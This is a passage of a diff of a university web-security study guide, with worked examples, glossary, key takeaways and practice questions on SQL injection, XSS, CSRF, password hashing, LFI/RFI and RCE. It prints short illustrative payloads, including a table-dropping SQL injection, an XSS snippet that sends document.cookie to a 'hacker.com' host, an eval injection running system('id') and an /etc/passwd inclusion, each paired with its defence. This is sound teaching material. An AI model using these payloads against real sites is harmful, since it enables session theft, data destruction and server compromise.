/e</p><p class="mn-note">the three classic code-execution vectors</p></div></div></div></section>
-<section class="section" id="worked-examples"><header class="section-head"><span class="section-num">18</span><h2>Worked Examples &amp; Scenarios</h2></header><div class="section-body"><div class="example"><span class="example-tag">Example 1</span><h3 class="example-title">Tracing a SQL injection</h3><p>The query is <code>SELECT first_name, last_name FROM users WHERE user_id = '$id';</code>. The attacker supplies <code>%27%3B+DROP+TABLE+users%3B+--</code>, which decodes to <code>'; DROP TABLE users; --</code>. The <code>'</code> closes the string, <code>;</code> ends the statement, <code>DROP TABLE users;</code> runs, and <code>--</code> comments the rest. Result: the <code>users</code> table is destroyed. Defence: parameterise the query so the whole payload is treated as a single literal value.</p></div><div class="example"><span class="example-tag">Example 2</span><h3 class="example-title">Cookie theft via XSS, then CSRF contrast</h3><p>A user's name is set to <code>&lt;script&gt;document.write('&lt;img src="http://hacker.com/collect.php?cookie=' + document.cookie + '" /&gt;')&lt;/script&gt;</code>. When any page lists that name, the victim's cookie is sent to the attacker, who can then authenticate as them. Notice this steals the session directly. CSRF is different: it never sees the cookie — it just makes the browser send the cookie automatically to a state-changing endpoint, which a CSRF token blocks.</p></div><div class="example"><span class="example-tag">Example 3</span><h3 class="example-title">Why stripping <code>&lt;script&gt;</code> fails</h3><p>If you strip <code>&lt;script&gt;</code> from input, the attacker submits <code>&lt;s&lt;script&gt;cript&gt;alert(1);&lt;/script&gt;</code>. Removing the inner tag leaves <code>&lt;script&gt;alert(1);&lt;/script&gt;</code>, which executes. Or the attacker uses <code>&lt;img src="x" onerror="alert(1)" /&gt;</code> with no script tag at all. The correct fix is output-side HTML escaping.</p></div><div class="example"><span class="example-tag">Example 4</span><h3 class="example-title">Salting stops a rainbow table</h3><p>Suppose two users both choose <code>password1</code>. Without salt, both hashes are identical and a rainbow table maps that hash straight back to <code>password1</code>. With a unique salt each, the stored values become <code>Hash("password1"+"a7f3")</code> and <code>Hash("password1"+"9c02")</code> — completely different, and absent from any precomputed table, so the attacker must brute-force each account separately.</p></div><div class="example"><span class="example-tag">Example 5</span><h3 class="example-title">Heightened RCE through eval</h3><p>Given <code>eval("\$myvar = \$x;")</code> with <code>$x = "1; system('id');"</code>, the server evaluates the string as code and runs <code>system('id')</code>, returning the server's identity to the attacker. Fix: never evaluate user input as code.</p></div></div></section>
-<section class="section" id="exam-focus"><header class="section-head"><span class="section-num">19</span><h2>Exam Practice</h2></header><div class="section-body"><div class="exam-bar"><div class="exam-progress"><span class="exam-count"><strong id="examDone">0</strong> / 14 mastered</span><span class="exam-track"><span id="examFill"></span></span></div><div class="exam-actions"><button type="button" class="btn" id="revealAll">Reveal all</button><button type="button" class="btn" id="hideAll">Hide all</button><button type="button" class="btn ghost" id="resetExam">Reset</button></div></div><article class="quiz" data-q="1"><button class="quiz-q" type="button" aria-expanded="false"><span class="quiz-n">1</span><span class="quiz-text">Why do websites get hacked?</span><span class="quiz-chev" aria-hidden="true">▾</span></button><div class="quiz-body"><div class="quiz-a"><span class="quiz-a-label">Answer</span>Designers protect the wrong things, protect the right things the wrong way, make poor assumptions, fail to understand the threat model, fail to account for paradigm shifts, and fail to understand their system's scope.</div><label class="mastered"><input type="checkbox" data-mastered="1"> Mark as mastered</label></div></article><article class="quiz" data-q="2"><button class="quiz-q" type="button" aria-expanded="false"><span class="quiz-n">2</span><span class="quiz-text">Distinguish server-side from client-side attacks with examples.</span><span class="quiz-chev" aria-hidden="true">▾</span></button><div class="quiz-body"><div class="quiz-a"><span class="quiz-a-label">Answer</span>Server-side attacks manipulate backend code/queries (SQLi, RCE, LFI/RFI); client-side attacks alter or intercept data in the victim's browser (XSS, CSRF).</div><label class="mastered"><input type="checkbox" data-mastered="2"> Mark as mastered</label></div></article><article class="quiz" data-q="3"><button class="quiz-q" type="button" aria-expanded="false"><span class="quiz-n">3</span><span class="quiz-text">Explain the root cause of SQL injection and its gold-standard defence.</span><span class="quiz-chev" aria-hidden="true">▾</span></button><div class="quiz-body"><div class="quiz-a"><span class="quiz-a-label">Answer</span>Untrusted input is concatenated into an SQL string, letting the attacker change query syntax. The defence is parameterised/prepared queries (or an ORM), which separate data from code.</div><label class="mastered"><input type="checkbox" data-mastered="3"> Mark as mastered</label></div></article><article class="quiz" data-q="4"><button class="quiz-q" type="button" aria-expanded="false"><span class="quiz-n">4</span><span class="quiz-text">Why is stripping <code>&lt;script&gt;</code> tags an inadequate XSS defence?</span><span class="quiz-chev" aria-hidden="true">▾</span></button><div class="quiz-body"><div class="quiz-a"><span class="quiz-a-label">Answer</span>It is bypassed by nested tags (<code>&lt;s&lt;script&gt;cript&gt;</code>) and by event-handler attributes like <code>&lt;img onerror="..."&gt;</code>. Output-side HTML escaping is required.</div><label class="mastered"><input type="checkbox" data-mastered="4"> Mark as mastered</label></div></article><article class="quiz" data-q="5"><button class="quiz-q" type="button" aria-expanded="false"><span class="quiz-n">5</span><span class="quiz-text">How does XSS become session hijacking?</span><span class="quiz-chev" aria-hidden="true">▾</span></button><div class="quiz-body"><div class="quiz-a"><span class="quiz-a-label">Answer</span>Injected JavaScript reads <code>document.cookie</code> and sends it to an attacker's server; the attacker then authenticates as the victim.</div><label class="mastered"><input type="checkbox" data-mastered="5"> Mark as mastered</label></div></article><article class="quiz" data-q="6"><button class="quiz-q" type="button" aria-expanded="false"><span class="quiz-n">6</span><span class="quiz-text">What is CSRF and why is a CSRF token in a cookie alone insufficient?</span><span class="quiz-chev" aria-hidden="true">▾</span></button><div class="quiz-body"><div class="quiz-a"><span class="quiz-a-label">Answer</span>CSRF forces a logged-in browser to send an unintended request; because browsers attach cookies automatically, mere presence proves nothing. The token must be submitted as a request variable/header bound to the session.</div><label class="mastered"><input type="checkbox" data-mastered="6"> Mark as mastered</label></div></article><article class="quiz" data-q="7"><button class="quiz-q" type="button" aria-expanded="false"><span class="quiz-n">7</span><span class="quiz-text">List the three desirable properties of a cryptographic hash function.</span><span class="quiz-chev" aria-hidden="true">▾</span></button><div class="quiz-body"><div class="quiz-a"><span class="quiz-a-label">Answer</span>One-way (pre-image resistance), unpredictable (avalanche effect), and collision-resistant (non-collision).</div><label class="mastered"><input type="checkbox" data-mastered="7"> Mark as mastered</label></div></article><article class="quiz" data-q="8"><button class="quiz-q" type="button" aria-expanded="false"><span class="quiz-n">8</span><span class="quiz-text">How does salting defeat rainbow tables?</span><span class="quiz-chev" aria-hidden="true">▾</span></button><div class="quiz-body"><div class="quiz-a"><span class="quiz-a-label">Answer</span>A unique random salt is concatenated with each password before hashing, so precomputed tables no longer match; attackers must recompute dictionary hashes per user.</div><label class="mastered"><input type="checkbox" data-mastered="8"> Mark as mastered</label></div></article><article class="quiz" data-q="9"><button class="quiz-q" type="button" aria-expanded="false"><span class="quiz-n">9</span><span class="quiz-text">Compare stateful and stateless authentication tokens.</span><span class="quiz-chev" aria-hidden="true">▾</span></button><div class="quiz-body"><div class="quiz-a"><span class="quiz-a-label">Answer</span>Stateful stores valid tokens/expiry in a database (e.g. Redis); stateless recalculates the token from a secret, time window, and user ID, trading CPU cost for reduced storage.</div><label class="mastered"><input type="checkbox" data-mastered="9"> Mark as mastered</label></div></article><article class="quiz" data-q="10"><button class="quiz-q" type="button" aria-expanded="false"><span class="quiz-n">10</span><span class="quiz-text">Which cookie attributes protect a session, and against what?</span><span class="quiz-chev" aria-hidden="true">▾</span></button><div class="quiz-body"><div class="quiz-a"><span class="quiz-a-label">Answer</span>HTTPS prevents network MITM sniffing; <code>Secure</code> ensures the cookie is only sent over HTTPS; <code>HttpOnly</code> stops scripts (e.g. XSS) from reading it.</div><label class="mastered"><input type="checkbox" data-mastered="10"> Mark as mastered</label></div></article><article class="quiz" data-q="11"><button class="quiz-q" type="button" aria-expanded="false"><span class="quiz-n">11</span><span class="quiz-text">Differentiate LFI and RFI.</span><span class="quiz-chev" aria-hidden="true">▾</span></button><div class="quiz-body"><div class="quiz-a"><span class="quiz-a-label">Answer</span>LFI loads local files already on the server (e.g. <code>/etc/passwd</code> via path traversal); RFI loads and executes a file from a remote attacker-controlled location.</div><label class="mastered"><input type="checkbox" data-mastered="11"> Mark as mastered</label></div></article><article class="quiz" data-q="12"><button class="quiz-q" type="button" aria-expanded="false"><span class="quiz-n">12</span><span class="quiz-text">Why is remote code execution considered the worst exploit?</span><span class="quiz-chev" aria-hidden="true">▾</span></button><div class="quiz-body"><div class="quiz-a"><span class="quiz-a-label">Answer</span>It lets the attacker run arbitrary code on the server, quickly leading to full system compromise.</div><label class="mastered"><input type="checkbox" data-mastered="12"> Mark as mastered</label></div></article><article class="quiz" data-q="13"><button class="quiz-q" type="button" aria-expanded="false"><span class="quiz-n">13</span><span class="quiz-text">How should a DDoS be defended against?</span><span class="quiz-chev" aria-hidden="true">▾</span></button><div class="quiz-body"><div class="quiz-a"><span class="quiz-a-label">Answer</span>There is no easy filter — detection adds overhead for legitimate users, so the practical approach is to absorb traffic using CDNs, Anycast, rate limiting, and WAFs.</div><label class="mastered"><input type="checkbox" data-mastered="13"> Mark as mastered</label></div></article><article class="quiz" data-q="14"><button class="quiz-q" type="button" aria-expanded="false"><span class="quiz-n">14</span><span class="quiz-text">What common thread links many real-world breaches?</span><span class="quiz-chev" aria-hidden="true">▾</span></button><div class="quiz-body"><div class="quiz-a"><span class="quiz-a-label">Answer</span>Basic authentication failures — empty passwords, default accounts with empty passwords, and accepting logins without checking passwords.</div><label class="mastered"><input type="checkbox" data-mastered="14"> Mark as mastered</label></div></article></div></section>
-    <footer class="foot"><strong>ELEC3609 study guide</strong> · Web Security &amp; Vulnerability Mitigation · 2025 Session · Built for self-paced revision.</footer>
+<h3 class="sub-title">Other notable cases</h3>
+<ul><li><strong>Dropbox</strong> — a security bug made passwords optional for four hours.</li><li><strong>vBulletin</strong> — CVE-2015-7808, exploited in Metasploit.</li><li><strong>The MySpace Sammy Worm</strong>.</li><li><strong>GitHub DDoS</strong>.</li><li><strong>The Annoying Site</strong>.</li></ul>
+<div class="callout c-info"><div class="callout-icon" aria-hidden="true">ℹ️</div><div class="callout-body"><strong>Note:</strong> Notice the pattern across all these cases — every one is a failure of a <em>basic</em> control (verify the password, don't ship empty defaults, actually check credentials). Sophisticated cryptography is worthless if the front door is unlocked.</div></div>
+<div class="reflect"><span class="ri" aria-hidden="true">🤔</span><div><strong>Pause &amp; predict:</strong> Pick one case above and write the single line of missing logic that would have prevented it. For "no password check," that line is trivial — which makes the bug's persistence the real lesson.</div></div>
+</section>
+<section class="guide-section" id="takeaways" data-title="Key Takeaways">
+  <div class="section-head"><span class="sec-num" aria-hidden="true"></span><h2 class="section-title">Key Takeaways</h2></div>
+  <p class="section-kicker">If you remember nothing else, remember this.</p>
+  <div class="takeaways"><div class="takeaway"><span class="tk-num">1</span><p>Systems get hacked because designers protect the wrong things, protect the right things wrongly, make poor assumptions, misjudge the threat model, ignore paradigm shifts, and misunderstand scope.</p></div><div class="takeaway"><span class="tk-num">2</span><p>Server-side attacks (SQLi, RCE, LFI/RFI) manipulate server code; user-side attacks (XSS, CSRF) manipulate data the user's browser trusts.</p></div><div class="takeaway"><span class="tk-num">3</span><p>Security is a resource game: all systems are buggy, bigger systems are buggier, nothing works in isolation, and humans are usually the weakest link.</p></div><div class="takeaway"><span class="tk-num">4</span><p>Rank risks on a 7-level severity scale by balancing likelihood of exploitation, damage if exploited, and mitigation cost.</p></div><div class="takeaway"><span class="tk-num">5</span><p>Learn from OWASP, CVE (160,000+ tracked incidents), DVWA and PentesterLab — but only test systems you have explicit permission to test; cloud scanning may require a pre-approved request.</p></div><div class="takeaway"><span class="tk-num">6</span><p>SQL injection arises from failing to sanitise input inserted into a database string; an ORM or parameterised query library defends against it, and sqlmap automates exploitation.</p></div><div class="takeaway"><span class="tk-num">7</span><p>XSS arises from injecting HTML/JavaScript into a page; the fix is HTML escaping on output, never blacklisting <code>&lt;script&gt;</code> tags (nested tags and <code>onerror</code> handlers bypass filters).</p></div><div class="takeaway"><span class="tk-num">8</span><p>CSRF exploits a browser-only authentication: the browser sends the cookie automatically, so the request must also carry a validated CSRF token as a variable on state-changing (POST) requests.</p></div><div class="takeaway"><span class="tk-num">9</span><p>Authentication has two stages — logging in, then identifying the session; passwords are stored as hashes (one-way, unpredictable, non-collision) so a database breach is not immediately fatal.</p></div><div class="takeaway"><span class="tk-num">10</span><p>Dictionary and rainbow-table attacks target weak human passwords; salting (ideally per-user) defeats precomputation, though a known salt still permits brute force.</p></div><div class="takeaway"><span class="tk-num">11</span><p>Auth tokens can be stateful (stored in a DB like Redis) or stateless (recomputed from a secret, timestamp and user id); stateless trades CPU for memory.</p></div><div class="takeaway"><span class="tk-num">12</span><p>Cookies must be sent over HTTPS and marked <code>secure</code> and <code>HttpOnly</code> to resist MITM sniffing and XSS-based cookie theft.</p></div><div class="takeaway"><span class="tk-num">13</span><p>LFI/RFI loads unexpected files, RCE runs attacker code (the worst outcome, via <code>eval()</code>, <code>unserialize()</code> or regex <code>e</code> flag), and DDoS floods traffic — the only real DDoS defence is absorbing the attack.</p></div><div class="takeaway"><span class="tk-num">14</span><p>Real breaches (macOS High Sierra, Steam, WD My Cloud, MS SQL Server, Keycloak) show that basic authentication checks are the controls that matter most.</p></div></div>
+</section>
+<section class="guide-section" id="glossary" data-title="Glossary">
+  <div class="section-head"><span class="sec-num" aria-hidden="true"></span><h2 class="section-title">Glossary</h2></div>
+  <p class="section-kicker">Every term you need to speak this week's language.</p>
+  <div class="glossary-tools"><button class="chip active" type="button" data-cat="all">All</button><button class="chip" type="button" data-cat="concept">Core concepts</button><button class="chip" type="button" data-cat="tech">Technologies &amp; tools</button><button class="chip" type="button" data-cat="method">Methods &amp; process</button></div>
+  <div class="terms"><div class="term-card" data-cat="concept"><div class="term-name">Threat model</div><div class="term-meaning">A description of who might attack a system, what they want, and how — the basis for deciding what to protect.</div></div><div class="term-card" data-cat="concept"><div class="term-name">Axioms of information security</div><div class="term-meaning">Six foundational truths, e.g. all systems are buggy and humans are the weakest link, that frame every security decision.</div></div><div class="term-card" data-cat="tech"><div class="term-name">OWASP</div><div class="term-meaning">The Open Web Application Security Project; maintains the Top 10 list of the most widespread web vulnerabilities.</div></div><div class="term-card" data-cat="tech"><div class="term-name">CVE</div><div class="term-meaning">Common Vulnerabilities and Exposures; a public catalogue of known breaches and data leaks, tracking over 160,000 incidents.</div></div><div class="term-card" data-cat="tech"><div class="term-name">DVWA</div><div class="term-meaning">Damn Vulnerable Web Application; a deliberately insecure app for practising basic web exploits.</div></div><div class="term-card" data-cat="tech"><div class="term-name">SQL Injection (SQLi)</div><div class="term-meaning">A vulnerability where unsanitised user input alters a database query, potentially allowing any query including data destruction.</div></div><div class="term-card" data-cat="tech"><div class="term-name">sqlmap</div><div class="term-meaning">An open-source Python tool that automates detecting and exploiting SQL injection.</div></div><div class="term-card" data-cat="tech"><div class="term-name">ORM</div><div class="term-meaning">Object-Relational Mapper; a database library that uses parameterised queries and so defends against SQL injection.</div></div><div class="term-card" data-cat="tech"><div class="term-name">Cross-Site Scripting (XSS)</div><div class="term-meaning">A vulnerability where an attacker injects HTML/JavaScript into a page, executing code in victims' browsers.</div></div><div class="term-card" data-cat="method"><div class="term-name">HTML escaping</div><div class="term-meaning">Converting characters like <code>&lt;</code>, <code>&gt;</code> and <code>&quot;</code> into entities (<code>&amp;lt;</code>, <code>&amp;gt;</code>, <code>&amp;quot;</code>) so output displays as text rather than rendering.</div></div><div class="term-card" data-cat="tech"><div class="term-name">Cross-Site Request Forgery (CSRF)</div><div class="term-meaning">An exploit that abuses automatic cookie authentication to make a victim's browser send an unintended, state-changing request.</div></div><div class="term-card" data-cat="tech"><div class="term-name">CSRF token</div><div class="term-meaning">A secret value embedded in the page/cookie and submitted as a request variable to prove a state-changing request is legitimate.</div></div><div class="term-card" data-cat="concept"><div class="term-name">Hash function</div><div class="term-meaning">A function mapping an input string to a fixed output hash; good ones are one-way, unpredictable and collision-resistant.</div></div><div class="term-card" data-cat="concept"><div class="term-name">Non-collision</div><div class="term-meaning">The property that two different input strings cannot feasibly map to the same output hash.</div></div><div class="term-card" data-cat="tech"><div class="term-name">Rainbow table</div><div class="term-meaning">A precomputed list of hashes of common passwords used to speed up dictionary attacks.</div></div><div class="term-card" data-cat="tech"><div class="term-name">Salt</div><div class="term-meaning">A random string concatenated with a password before hashing; stored in plaintext beside the hash and, ideally, unique per user.</div></div><div class="term-card" data-cat="concept"><div class="term-name">Auth token</div><div class="term-meaning">The credential issued after login and carried in a cookie to identify an authenticated session.</div></div><div class="term-card" data-cat="tech"><div class="term-name">Stateful token</div><div class="term-meaning">An auth token whose validity and expiry are stored server-side in a database (e.g. Redis).</div></div><div class="term-card" data-cat="tech"><div class="term-name">Stateless (calculated) token</div><div class="term-meaning">An auth token recomputed on each request from a secret, a time bucket and the user id, avoiding token storage.</div></div><div class="term-card" data-cat="tech"><div class="term-name"><code>secure</code> attribute</div><div class="term-meaning">A cookie flag ensuring the cookie is only sent over HTTPS.</div></div><div class="term-card" data-cat="tech"><div class="term-name"><code>HttpOnly</code> attribute</div><div class="term-meaning">A cookie flag preventing page scripts (and thus XSS) from reading the cookie.</div></div><div class="term-card" data-cat="tech"><div class="term-name">LFI/RFI</div><div class="term-meaning">Local/Remote File Inclusion; manipulating an app into loading an unexpected local or remote file, e.g. <code>/etc/passwd</code>.</div></div><div class="term-card" data-cat="tech"><div class="term-name">Remote Code Execution (RCE)</div><div class="term-meaning">The worst class of exploit, where an attacker runs arbitrary code on the server, quickly leading to full compromise.</div></div><div class="term-card" data-cat="tech"><div class="term-name">DDoS</div><div class="term-meaning">Distributed Denial of Service; flooding a site with traffic so legitimate requests cannot be served.</div></div></div>
+  <p class="empty-note" id="glossaryEmpty">No terms in this category.</p>
+</section>
+<section class="guide-section" id="practice" data-title="Practice Questions">
+  <div class="section-head"><span class="sec-num" aria-hidden="true"></span><h2 class="section-title">Practice Questions</h2></div>
+  <p class="section-kicker">Look away from the page first — retrieval is what builds memory.</p>
+  <div class="quiz-toolbar">
+    <span class="progress-copy" id="quizProgressCopy">Answer, reveal, then tick “Mastered”. Your progress is saved.</span>
+    <button class="btn" id="revealAll" type="button">Reveal all</button>
+    <button class="btn" id="hideAll" type="button">Hide all</button>
+    <button class="btn" id="resetProgress" type="button">Reset</button>
+  </div>
+<article class="quiz" id="q1">
+    <div class="quiz-head"><span class="quiz-qnum">Q1</span><p class="quiz-q">Name four reasons system designers allow their systems to be hacked, and state the three factors that decide where to focus security effort.</p></div>
+    <div class="quiz-answer"><strong>Answer:</strong> Any four of: they protect the wrong things; they protect the right things in the wrong way; they make poor assumptions about their systems; they fail to understand the threat model; they fail to account for paradigm shifts (e.g. the Internet); they fail to understand the scope of their system. Effort is prioritised by balancing the likelihood of exploitation, the damage if exploited, and the mitigation cost to prevent exploitation.</div>
+    <div class="quiz-actions">
+      <button class="quiz-reveal" type="button">Show answer</button>
+      <label class="mastered"><input type="checkbox"> Mastered</label>
+    </div>
+  </article>
+<article class="quiz" id="q2">
+    <div class="quiz-head"><span class="quiz-qnum">Q2</span><p class="quiz-q">Distinguish server-side from user-side web attacks and give two examples of each.</p></div>
+    <div class="quiz-answer"><strong>Answer:</strong> Server-side attacks compromise the servers by manipulating server-side code — examples are SQL Injection, Remote Code Execution, and Local/Remote File Inclusion. User-side attacks alter or intercept data on a user's computer while they use the site as intended — examples are Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF).</div>
+    <div class="quiz-actions">
+      <button class="quiz-reveal" type="button">Show answer</button>
+      <label class="mastered"><input type="checkbox"> Mastered</label>
+    </div>
+  </article>
+<article class="quiz" id="q3">
+    <div class="quiz-head"><span class="quiz-qnum">Q3</span><p class="quiz-q">Explain, with the lecture's example, why stripping <code>&lt;script&gt;</code> tags from user input fails to prevent XSS.</p></div>
+    <div class="quiz-answer"><strong>Answer:</strong> Because stripping can itself create a working tag: the input <code>&lt;s&lt;script&gt;cript&gt;…&lt;/script&gt;</code> has its inner <code>&lt;script&gt;…&lt;/script&gt;</code> removed, leaving <code>&lt;script&gt;…&lt;/script&gt;</code>, which executes. Moreover many XSS vectors don't use <code>&lt;script&gt;</code> at all — e.g. <code>&lt;img src=&quot;img.jpg&quot; onerror=&quot;alert(1)&quot; /&gt;</code>. There are too many variants to blacklist.</div>
+    <div class="quiz-actions">
+      <button class="quiz-reveal" type="button">Show answer</button>
+      <label class="mastered"><input type="checkbox"> Mastered</label>
+    </div>
+  </article>
+<article class="quiz" id="q4">
+    <div class="quiz-head"><span class="quiz-qnum">Q4</span><p class="quiz-q">State the correct two-step approach to preventing XSS.</p></div>
+    <div class="quiz-answer"><strong>Answer:</strong> (1) Store user input in the database as-is, even if it contains HTML tags. (2) HTML-escape all data by default when displaying it, so it is printed as text and never interpreted as HTML by the browser.</div>
+    <div class="quiz-actions">
+      <button class="quiz-reveal" type="button">Show answer</button>
+      <label class="mastered"><input type="checkbox"> Mastered</label>
+    </div>
+  </article>
+<article class="quiz" id="q5">
+    <div class="quiz-head"><span class="quiz-qnum">Q5</span><p class="quiz-q">Given a user whose name is <code>&lt;script&gt;alert(&quot;LOL&quot;);&lt;/script&gt;</code> in a heading template, show the HTML-escaped output and explain the result.</p></div>
+    <div class="quiz-answer"><strong>Answer:</strong> The output is <code>&lt;H1&gt;Hello &amp;lt;script&amp;gt;alert(&amp;quot;LOL&amp;quot;);&amp;lt;/script&amp;gt;&lt;/H1&gt;</code>. The <code>&lt;</code>, <code>&gt;</code> and <code>&quot;</code> characters become entities, so the browser prints the literal text to the screen rather than rendering it as HTML or executing the script.</div>
+    <div class="quiz-actions">
+      <button class="quiz-reveal" type="button">Show answer</button>
+      <label class="mastered"><input type="checkbox"> Mastered</label>
+    </div>
+  </article>
+<article class="quiz" id="q6">
+    <div class="quiz-head"><span class="quiz-qnum">Q6</span><p class="quiz-q">Why does stealing a user's cookie let an attacker act as that user, which cookie attribute blocks the XSS route to this, and how should auth cookies be stored and sent?</p></div>
+    <div class="quiz-answer"><strong>Answer:</strong> The auth token/session cookie is the proof of a logged-in session, so possessing it lets the attacker authenticate as the victim without a password. Setting the cookie's <code>HttpOnly</code> attribute prevents page scripts (and therefore injected XSS JavaScript) from reading it via <code>document.cookie</code>. Cookies should also always be sent over HTTPS (preventing MITM sniffing) and carry the <code>secure</code> attribute so they are only sent over HTTPS.</div>
+    <div class="quiz-actions">
+      <button class="quiz-reveal" type="button">Show answer</button>
+      <label class="mastered"><input type="checkbox"> Mastered</label>
+    </div>
+  </article>
+<article class="quiz" id="q7">
+    <div class="quiz-head"><span class="quiz-qnum">Q7</span><p class="quiz-q">What is CSRF, on which request types should a CSRF token be used, and how does it prevent the attack?</p></div>
+    <div class="quiz-answer"><strong>Answer:</strong> CSRF is an exploit that works when only the browser is authenticated (via a cookie) but the user's request is not, letting an attacker cause an unintended state-changing request. Tokens are used on requests that change data — typically POST but not GET. A CSRF token is a secret value placed in the HTML/cookies and submitted as a POST request variable; the server validates that the submitted token matches, authenticating the request itself. Checking merely that a token is present in the cookie is not enough.</div>
+    <div class="quiz-actions">
+      <button class="quiz-reveal" type="button">Show answer</button>
+      <label class="mastered"><input type="checkbox"> Mastered</label>
+    </div>
+  </article>
+<article class="quiz" id="q8">
+    <div class="quiz-head"><span class="quiz-qnum">Q8</span><p class="quiz-q">Describe the three steps of a typical login and explain why passwords are stored as hashes.</p></div>
+    <div class="quiz-answer"><strong>Answer:</strong> (1) The user submits username and password. (2) The server hashes the password and compares it with the stored hash for that user. (3) If they match, the server returns an authentication cookie/token. Passwords are stored as hashes so that if the database is breached the attacker cannot use the values as-is and must first reverse the hash — and good hashes are one-way.</div>
+    <div class="quiz-actions">
+      <button class="quiz-reveal" type="button">Show answer</button>
+      <label class="mastered"><input type="checkbox"> Mastered</label>
+    </div>
+  </article>
+<article class="quiz" id="q9">
+    <div class="quiz-head"><span class="quiz-qnum">Q9</span><p class="quiz-q">List the three desirable properties of a hash function and define each.</p></div>
+    <div class="quiz-answer"><strong>Answer:</strong> One-way — given a hash, the original string cannot be computed. Unpredictable — you cannot choose an input string to obtain a particular output hash. Non-collision — you cannot find two input strings that map to the same output hash.</div>
+    <div class="quiz-actions">
+      <button class="quiz-reveal" type="button">Show answer</button>
+      <label class="mastered"><input type="checkbox"> Mastered</label>
+    </div>
+  </article>
+<article class="quiz" id="q10">
+    <div class="quiz-head"><span class="quiz-qnum">Q10</span><p class="quiz-q">Explain how a rainbow table attack works and how salting defends against it.</p></div>
+    <div class="quiz-answer"><strong>Answer:</strong> A rainbow table is a precomputed list of hashes of common passwords used to reverse stolen hashes quickly. Salting concatenates a random string (ideally unique per user) to the password before hashing, so identical passwords produce different hashes; the attacker cannot reuse precomputed tables and must redo the work for each salt. Once a salt is known, brute-force dictionary attacks may still be attempted.</div>
+    <div class="quiz-actions">
+      <button class="quiz-reveal" type="button">Show answer</button>
+      <label class="mastered"><input type="checkbox"> Mastered</label>
+    </div>
+  </article>
+<article class="quiz" id="q11">
+    <div class="quiz-head"><span class="quiz-qnum">Q11</span><p class="quiz-q">Compare stateful and stateless authentication tokens, including their trade-offs, and explain the roles of the secret key, rounded timestamp and user id in the calculated-token code.</p></div>
+    <div class="quiz-answer"><strong>Answer:</strong> Stateful tokens store valid tokens and their expiry in a database (e.g. Redis); stateless (calculated) tokens are recomputed each request from a secret, a time bucket and the user id and validated by comparison. Stateless avoids token storage (lower memory) but adds computational overhead because the token is recomputed on every request. In the code, the secret key (two parts, prepended and appended) makes the token unforgeable; the timestamp rounded down to a 6-hour window (<code>timestamp - timestamp % 21600</code>) creates a time-bucketed validity so the token changes when the window rolls over; the user id binds the token to a specific user. They are hashed with SHA-512 and returned as a hex digest.</div>
+    <div class="quiz-actions">
+      <button class="quiz-reveal" type="button">Show answer</button>
+      <label class="mastered"><input type="checkbox"> Mastered</label>
+    </div>
+  </article>
+<article class="quiz" id="q12">
+    <div class="quiz-head"><span class="quiz-qnum">Q12</span><p class="quiz-q">What are LFI/RFI and RCE, give a vulnerable snippet for each, and state the relevant defences or culprits?</p></div>
+    <div class="quiz-answer"><strong>Answer:</strong> Local/Remote File Inclusion is manipulating an app into loading an unexpected file, e.g. <code>$page = $_GET[&quot;page&quot;]; include($page);</code>. Visiting <code>http://example.com/index.php?page=/etc/passwd</code> outputs <code>/etc/passwd</code> if misconfigured. Local means files already on the server; remote means loading from a remote location. Defence: never let user parameters govern which files are included. Remote Code Execution is where an attacker supplies code that runs on the remote server; it is the worst exploit because it quickly leads to full server compromise, with common culprits being <code>eval()</code> (or equivalent), PHP <code>unserialize()</code>, and regular expressions with the <code>e</code> flag.</div>
+    <div class="quiz-actions">
+      <button class="quiz-reveal" type="button">Show answer</button>
+      <label class="mastered"><input type="checkbox"> Mastered</label>
+    </div>
+  </article>
+<article class="quiz" id="q13">
+    <div class="quiz-head"><span class="quiz-qnum">Q13</span><p class="quiz-q">Why is DDoS defence so difficult, and what is the only real defence?</p></div>
+    <div class="quiz-answer"><strong>Answer:</strong> Because detection mechanisms introduce a large amount of overhead for legitimate requests, so distinguishing attack traffic from real users is costly. The only real way to defend is to "absorb" the attack traffic.</div>
+    <div class="quiz-actions">
+      <button class="quiz-reveal" type="button">Show answer</button>
+      <label class="mastered"><input type="checkbox"> Mastered</label>
+    </div>
+  </article>
+<article class="quiz" id="q14">
+    <div class="quiz-head"><span class="quiz-qnum">Q14</span><p class="quiz-q">Give an example of a real-world case where an empty or missing password check caused a compromise.</p></div>
+    <div class="quiz-answer"><strong>Answer:</strong> Examples include Apple/macOS High Sierra (2017), where an admin could log in with no password; Valve/Steam (2015); Linux-PAM &lt; 1.5.1 (CVE-2020-27780) for empty passwords; Western Digital My Cloud (CVE-2019-9950), Microsoft SQL Server (CVE-2000-1209) and D-Link (CVE-2020-8864) for default accounts with empty passwords; and IRC5 (CVE-2020-10288), Eclipse Mosquitto (CVE-2018-12551) and Keycloak (CVE-2019-14909) for not checking passwords at all.</div>
+    <div class="quiz-actions">
+      <button class="quiz-reveal" type="button">Show answer</button>
+      <label class="mastered"><input type="checkbox"> Mastered</label>
+    </div>
+  </article>
+</section>
+<section class="guide-section" id="checklist" data-title="Confidence Check">
+  <div class="section-head"><span class="sec-num" aria-hidden="true"></span><h2 class="section-title">Confidence Check</h2></div>
+  <p class="section-kicker">Tick only what you could explain out loud to a teammate.</p>
+  <div class="checklist"><label class="check-item"><input type="checkbox"> I can explain why web applications get hacked, name the six designer failure modes, and state the axioms of information security.</label><label class="check-item"><input type="checkbox"> I can distinguish server-side attacks (SQLi, RCE, LFI/RFI) from user-side attacks (XSS, CSRF) and give examples of each.</label><label class="check-item"><input type="checkbox"> I can rank a risk on the 7-level severity scale using likelihood, damage and mitigation cost.</label><label class="check-item"><input type="checkbox"> I can name OWASP, CVE, DVWA and PentesterLab and explain the legal requirement to obtain permission before testing.</label><label class="check-item"><input type="checkbox"> I can identify and exploit a SQL injection given vulnerable PHP and explain how an ORM/parameterised query prevents it.</label><label class="check-item"><input type="checkbox"> I can demonstrate how XSS injects JavaScript, how that steals cookies, and why stripping <code>&lt;script&gt;</code> tags fails.</label><label class="check-item"><input type="checkbox"> I can apply HTML escaping on output to neutralise XSS and describe the correct two-step storage/display model.</label><label class="check-item"><input type="checkbox"> I can explain CSRF, why browser-only authentication is insufficient, and how a validated CSRF token on POST requests prevents it.</label><label class="check-item"><input type="checkbox"> I can describe the two stages of authentication and the three-step login flow with password hashing.</label><label class="check-item"><input type="checkbox"> I can state the three properties of a good hash function and explain dictionary, rainbow-table and salting defences.</label><label class="check-item"><input type="checkbox"> I can compare stateful and stateless auth tokens and apply the HTTPS, <code>secure</code> and <code>HttpOnly</code> cookie rules.</label><label class="check-item"><input type="checkbox"> I can explain LFI/RFI, RCE and 